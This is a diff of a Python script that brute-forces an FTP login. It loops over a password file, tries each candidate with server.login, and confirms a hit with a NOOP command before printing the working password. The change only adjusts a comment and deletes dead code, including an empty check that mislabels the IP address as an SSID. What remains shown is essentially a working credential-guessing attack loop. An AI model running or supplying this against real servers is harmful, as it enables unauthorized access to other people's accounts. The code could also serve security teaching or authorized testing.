@@ -23,16 +23,11 @@ with open(file_path, "r", errors='replace') as f:
 			server.login(username,potential_password)
 			check_login = server.voidcmd("NOOP")	#send NOOP cmd and wait for 2xx response
 			check_login = check_login[0] #get first char of response
-			if(check_login == '2'):
+			if(check_login == '2'):		#if response print password and exit
 				print(potential_password)
 				break
-			# else:
-			# 	server.connect(IP_ADDR)
 		except:
 			pass
-		if ():
-			print('password for SSID "' + IP_ADDR + '" is ' + potential_password)
-			print(potential_password)
 #time.sleep(300)
 time_stop = time.time()			#end clock
 time_check = time_stop - time_start
